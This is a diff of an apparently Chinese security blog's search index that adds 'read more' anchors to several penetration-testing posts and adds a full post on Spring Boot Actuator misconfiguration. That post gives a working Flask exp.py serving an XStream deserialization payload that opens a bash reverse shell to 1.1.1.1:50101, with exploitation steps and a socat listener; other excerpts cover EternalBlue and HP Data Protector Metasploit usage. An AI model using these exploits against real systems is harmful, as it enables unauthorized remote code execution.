@@ -259,6 +259,7 @@ st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="di
     <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
 <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在WEB渗透中经常可以看到页面存在一次性<code>token</code>校验的情况，即请求包中包含<code>token</code>，而<code>token</code>值需通过其它页面获取，导致<code>burpsuite</code>抓包后无法重放。</p>
 <h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>下面以一个简单例子来做个说明。目标网站如下，页面存在一个图片验证码，题目要求暴力破解得到账号密码。这题可以有多种方式实现，这里以<code>burpsuite</code>宏进行实验。<br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-55-39.png"></p>
+<a id="more"></a>
 <h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><ol>
 <li>目标URL为：<code>http://1.1.1.1/c/hdyzma/welcome.php</code>，抓个包测试一下，发现其会对<code>token</code>参数校验，拒绝重放的数据包。<br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-56-17.png"><br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-56-24.png"></li>
 <li>在登陆页面<code>http://1.1.1.1/c/hdyzma/</code>可发现<code>token</code>值：<br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-56-48.png"></li>
@@ -294,6 +295,7 @@ st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="di
     <url>/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong><br>本文已在Freebuf发布，但文章经Freebuf编辑改动导致有小部分错误，故在这里改正并重新发布。<br><em>原文链接： <a href="https://www.freebuf.com/vuls/185380.html">https://www.freebuf.com/vuls/185380.html</a></em></p>
 <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近为甲方做渗透测试发现了一个远程命令执行漏洞，可以通过构造恶意参数传递执行bash命令，本文回顾一下漏洞的挖掘过程。</p>
+<a id="more"></a>
 <h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><ol>
 <li>通过<code>nessus</code>扫描器的<code>Sitemap</code>模块，发现了可疑目录：<br><img src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-26-26.png"></li>
 <li>根据<code>sitemap</code>的目录信息，打开URL:<code>http://x.x.x.x:28076/file/</code>，发现存在未授权访问漏洞：<br><img src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-26-57.png"></li>
@@ -364,6 +366,7 @@ st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="di
     <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
 <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文总结了一些通过<code>cmd</code>或者<code>bash</code>等<code>shell</code>写文件的方法，如在某些情况下，拿到了<code>cmd shell</code>或者<code>bash shell</code>，如下图：<br><img src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-00-21.png"></p>
 <p>但是靶机无法上公网和反连攻击机，然后通过<code>echo</code>等方式写<code>shell</code>的方法。受限于本人有限的知识面以及实用性等考量，这里列出的方法并不全面，仅供参考。</p>
+<a id="more"></a>
 <h3 id="Windows-下写文件"><a href="#Windows-下写文件" class="headerlink" title="Windows 下写文件"></a>Windows 下写文件</h3><h4 id="echo写文件"><a href="#echo写文件" class="headerlink" title="echo写文件"></a>echo写文件</h4><p>这是最原始的方法，比较折腾人。如果你以为只要<code>echo 1 &gt; 1.txt</code>这样写入，就图样了。Windows下的<code>cmd echo</code>写入需要特殊字符转义，如下：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt; --- ^&lt;</span><br><span class="line">&gt; --- ^&gt;</span><br><span class="line">/ --- ^/</span><br><span class="line">+ --- ^+</span><br></pre></td></tr></table></figure>
 <p>另外，由于web服务器自动转码<code>URL编码</code>，把原本不是URL编码的字符转码了，导致写入的文件错误，所以还需对下面的字符转码：</p>
@@ -417,6 +420,7 @@ st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="di
     <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
 <h3 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h3><p>本文无任何技术水平，仅用来记录一次<code>Eternalblue-Doublepulsar</code>利用过程，作笔记使用。</p>
 <h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><p>本次实验在虚拟机中进行，攻击机与靶机位于同一局域网内。<br>攻击机：<code>Kali Linux</code>（IP：<code>192.168.200.130</code>）<br>靶机：<code>Windows 7 x64</code>（IP：<code>192.168.200.142</code>）</p>
+<a id="more"></a>
 <h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>下载<code>Eternalblue-Doublepulsar</code>到<code>/root</code>目录，这里最好不要改，因为工具里面配置的默认目录就是这个目录，改了的话相应的也要在<code>msf</code>里面改<code>DOUBLEPULSARPATH</code>、<code>ETERNALBLUEPATH</code>这两个变量</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git</span><br></pre></td></tr></table></figure>
 <p>复制<code>eternalblue_doublepulsar.rb</code>到<code>/usr/share/metasploit-framework/modules/exploits/windows/smb/</code>目录</p>
@@ -447,6 +451,7 @@ st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="di
 <h3 id="HP-Data-Protector远程命令执行（CVE-2011-0923）"><a href="#HP-Data-Protector远程命令执行（CVE-2011-0923）" class="headerlink" title="HP Data Protector远程命令执行（CVE-2011-0923）"></a>HP Data Protector远程命令执行（CVE-2011-0923）</h3><p>HP Data Protector存在一个命令执行漏洞，恶意用户可以发送数据包导致这种特殊的服务来执行任意shell命令。这个漏洞在内网中很常见，端口为TCP<code>5555</code>，基本上一打一个准，这里说下利用过程，以作记录。</p>
 <h3 id="正常利用过程"><a href="#正常利用过程" class="headerlink" title="正常利用过程"></a>正常利用过程</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/linux/misc/hp_data_protector_cmd_exec</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> rhosts 1.1.1.1</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; exploit</span><br></pre></td></tr></table></figure>
 <p><img src="/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2020-08-20-17-40-26.png"></p>
+<a id="more"></a>
 <h3 id="网络受限情况下的利用过程"><a href="#网络受限情况下的利用过程" class="headerlink" title="网络受限情况下的利用过程"></a>网络受限情况下的利用过程</h3><p>某些特殊受限网络情况下，无法连接<code>Bind Shell</code>或者<code>Reverse Shell</code>，可以使用<code>cmd/unix/generic</code>这个<code>payload</code>执行命令并获取回显。</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/linux/misc/hp_data_protector_cmd_exec</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> rhosts 1.1.1.1</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> payload cmd/unix/generic </span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> cmd whoami</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; exploit</span><br></pre></td></tr></table></figure>
 <p><img src="/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2020-08-20-17-41-18.png"></p>
@@ -486,7 +491,8 @@ st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="di
 <li><p>去除HTTP协议头，<code>http://baidu.com</code>-&gt;<code>baidu.com</code></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">domain = re.sub(<span class="string">&#x27;https?://&#x27;</span>, <span class="string">&#x27;&#x27;</span>, domain, flags=re.IGNORECASE)</span><br></pre></td></tr></table></figure></li>
 <li><p>把字符串内多个空格合并成一个空格，<code>&#39;　　　&#39;</code>-&gt;<code>&#39; &#39;</code></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">line = re.sub(<span class="string">&#x27; +&#x27;</span>, <span class="string">&#x27; &#x27;</span>, line)</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">line = re.sub(<span class="string">&#x27; +&#x27;</span>, <span class="string">&#x27; &#x27;</span>, line)</span><br></pre></td></tr></table></figure>
+<a id="more"></a></li>
 <li><p>超大文件读取, 超大文件读取使用fileinput，会逐行读取，而readlines会一次读完导致内存爆炸</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># def read_ip_history_file(filename):</span></span><br><span class="line"><span class="comment">#     with open(filename, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span></span><br><span class="line"><span class="comment">#         for line in f.readlines():</span></span><br><span class="line"><span class="comment">#             line = line.strip()</span></span><br><span class="line"><span class="comment">#             yield line</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_ip_history_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> fileinput.input([filename], openhook = fileinput.hook_encoded(<span class="string">&quot;utf-8&quot;</span>)):</span><br><span class="line">        <span class="keyword">yield</span> line</span><br><span class="line"> <span class="comment"># 或者</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">read_ip_history_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">     <span class="keyword">with</span> open(filename, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">         <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">             line = line.strip()</span><br><span class="line">             <span class="keyword">yield</span> line</span><br></pre></td></tr></table></figure>
 </li>
@@ -516,7 +522,8 @@ st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="di
 <li>xargs占位符<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> aaa |xargs -I &#123;&#125; python3 test.py &#123;&#125; &#123;&#125;.xlsx</span><br></pre></td></tr></table></figure></li>
 <li>查看进程启动时间<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -eo pid,lstart,etime,cmd | grep nginx</span><br></pre></td></tr></table></figure></li>
 <li>找出大于500m的文件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -size +500M -print0 |xargs -0 ls -l</span><br></pre></td></tr></table></figure></li>
-<li>Debian显示已安装的软件包<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt list --installed</span><br></pre></td></tr></table></figure></li>
+<li>Debian显示已安装的软件包<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt list --installed</span><br></pre></td></tr></table></figure>
+<a id="more"></a></li>
 <li>批量杀进程<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux |grep hydra |awk <span class="string">&#x27;&#123;printf &quot;%s\n&quot;, $2&#125;&#x27;</span> |xargs <span class="built_in">kill</span> -9</span><br></pre></td></tr></table></figure></li>
 <li>apt-get配置代理<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://192.168.137.1:1080</span><br></pre></td></tr></table></figure></li>
 <li>wget设置代理<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/3.5.2/Python-3.5.2rc1.tgz -e <span class="string">&#x27;https_proxy=http://192.168.137.1:1080&#x27;</span></span><br></pre></td></tr></table></figure></li>
@@ -544,6 +551,7 @@ st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="di
 </ul>
 <h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>xlrd提供了<code>sheet.merged_cells</code>用于获取页面中所有的合并单元格坐标。类似：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(<span class="number">1</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>)]</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
 <p>坐标从0开始算起，代表第1行到第4行（不包含4），第0列到第一列（不包含1）为合并单元格。</p>
 <p>这里有一个点要注意，xlrd官方说明中，需要在<code>open_workbook</code>时传入<code>formatting_info=True</code>，如果未设置此选项，获取到的合并单元格坐标为空，这点是很多文章没有提到的，可能是版本的变更问题：<br><img src="/2020/04/01/Python%E8%AF%BB%E5%8F%96Excel%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC/2020-08-20-19-14-52.png"></p>
 <p>示例代码：</p>
@@ -562,6 +570,107 @@ st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="di
       </categories>
       <tags>
         <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Spring Boot Actuators未授权GetShell</title>
+    <url>/2020/06/05/Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/</url>
+    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块。其提供的执行器端点分为两类：原生端点和用户自定义扩展端点，原生端点主要有：  </p>
+<a id="more"></a>
+
+<table>
+<thead>
+<tr>
+<th>Http 方法</th>
+<th>路径</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>get</td>
+<td>/autoconfig</td>
+<td>提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过</td>
+</tr>
+<tr>
+<td>get</td>
+<td>/configprops</td>
+<td>描述配置属性（包含默认值）如何注入 Bean</td>
+</tr>
+<tr>
+<td>get</td>
+<td>/beans</td>
+<td>描述应用程序上下文里全部的 Bean，以及它们的关系</td>
+</tr>
+<tr>
+<td>get</td>
+<td>/dump</td>
+<td>获取线程活动的快照</td>
+</tr>
+<tr>
+<td>get</td>
+<td>/env</td>
+<td>获取全部环境属性</td>
+</tr>
+<tr>
+<td>get</td>
+<td>/env/{name}</td>
+<td>根据名称获取特定的环境属性值</td>
+</tr>
+<tr>
+<td>get</td>
+<td>/health</td>
+<td>报告应用程序的健康指标，这些值由 HealthIndicator 的实现类提供</td>
+</tr>
+<tr>
+<td>get</td>
+<td>/info</td>
+<td>获取应用程序的定制信息，这些信息由 info 打头的属性提供</td>
+</tr>
+<tr>
+<td>get</td>
+<td>/mappings</td>
+<td>描述全部的 URI 路径，以及它们和控制器（包含 Actuator 端点）的映射关系</td>
+</tr>
+<tr>
+<td>get</td>
+<td>/metrics</td>
+<td>报告各种应用程序度量信息，比如内存用量和 HTTP 请求计数</td>
+</tr>
+<tr>
+<td>get</td>
+<td>/metrics/{name}</td>
+<td>报告指定名称的应用程序度量值</td>
+</tr>
+<tr>
+<td>post</td>
+<td>/shutdown</td>
+<td>关闭应用程序，要求 endpoints.shutdown.enabled 设置为 true（默认为 false）</td>
+</tr>
+<tr>
+<td>get</td>
+<td>/trace</td>
+<td>提供基本的 HTTP 请求跟踪信息（时间戳、HTTP 头等）</td>
+</tr>
+</tbody></table>
+<h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p>访问web应用的<code>/actuator/env</code>或<code>/env</code>，如果有返回json格式的数据则可能存在漏洞。</p>
+<h3 id="漏洞exp"><a href="#漏洞exp" class="headerlink" title="漏洞exp"></a>漏洞exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, defaults=&#123;&#x27;path&#x27;: &#x27;&#x27;&#125;)</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/&lt;path:path&gt;&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catch_all</span>(<span class="params">path</span>):</span></span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;&lt;linked-hash-set&gt;</span></span><br><span class="line"><span class="string">  &lt;jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;dataHandler&gt;</span></span><br><span class="line"><span class="string">        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span></span><br><span class="line"><span class="string">              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span></span><br><span class="line"><span class="string">                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;command&gt;</span></span><br><span class="line"><span class="string">                    &lt;string&gt;bash&lt;/string&gt;</span></span><br><span class="line"><span class="string">                      &lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="string">                      &lt;string&gt;bash -i &gt;/dev/tcp/1.1.1.1/50101 0&gt;&amp;amp;1&lt;/string&gt;</span></span><br><span class="line"><span class="string">                    &lt;/command&gt;</span></span><br><span class="line"><span class="string">                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span></span><br><span class="line"><span class="string">                  &lt;/next&gt;</span></span><br><span class="line"><span class="string">                &lt;/iter&gt;</span></span><br><span class="line"><span class="string">                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;method&gt;</span></span><br><span class="line"><span class="string">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span></span><br><span class="line"><span class="string">                    &lt;name&gt;start&lt;/name&gt;</span></span><br><span class="line"><span class="string">                    &lt;parameter-types/&gt;</span></span><br><span class="line"><span class="string">                  &lt;/method&gt;</span></span><br><span class="line"><span class="string">                  &lt;name&gt;foo&lt;/name&gt;</span></span><br><span class="line"><span class="string">                &lt;/filter&gt;</span></span><br><span class="line"><span class="string">                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span></span><br><span class="line"><span class="string">              &lt;/serviceIterator&gt;</span></span><br><span class="line"><span class="string">              &lt;lock/&gt;</span></span><br><span class="line"><span class="string">            &lt;/cipher&gt;</span></span><br><span class="line"><span class="string">            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span></span><br><span class="line"><span class="string">            &lt;ibuffer&gt;&lt;/ibuffer&gt;</span></span><br><span class="line"><span class="string">          &lt;/is&gt;</span></span><br><span class="line"><span class="string">        &lt;/dataSource&gt;</span></span><br><span class="line"><span class="string">      &lt;/dataHandler&gt;</span></span><br><span class="line"><span class="string">    &lt;/value&gt;</span></span><br><span class="line"><span class="string">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">&lt;/linked-hash-set&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> Response(xml, mimetype=<span class="string">&#x27;application/xml&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">50102</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先把exp报错为<code>exp.py</code>文件，然后修改第37行的ip地址为接收反弹shell的ip，然后运行<code>exp.py</code>：<br><img src="/2020/06/05/Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/2020-08-20-19-43-34.png"></p>
+<p>配置<code>eureka.client.serviceUrl.defaultZone=http://1.1.1.1:50102/xstream</code>，其中的ip地址为<code>exp.py</code>监听的地址：<br><img src="/2020/06/05/Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/2020-08-20-19-45-25.png"></p>
+<p>然后通过<code>refresh</code>端点刷新，靶机将通过刚刚在<code>env</code>配置的<code>eureka.client.serviceUrl.defaultZone</code>路径发起请求，获取恶意XML文件：<br><img src="/2020/06/05/Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/2020-08-20-19-48-27.png"></p>
+<p><code>exp.py</code>接收到靶机发起的请求：<br><img src="/2020/06/05/Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/2020-08-20-19-49-49.png"></p>
+<p>获得反弹shell：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat tcp<span class="_">-l</span>:50101,fork,reuseaddr -</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/06/05/Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/2020-08-20-19-50-54.png"></p>
+<p><strong>注意：</strong> <code>http://1.1.1.1:50102/xstream</code>返回的是<code>application/xml</code>格式数据，否则服务端不认，所以需要运行<code>exp.py</code>来做服务。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.freebuf.com/news/193509.html">Springboot之actuator配置不当的漏洞利用</a><br><a href="https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Spring Boot Actuators配置不当导致RCE漏洞复现</a></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
       </tags>
   </entry>
 </search>
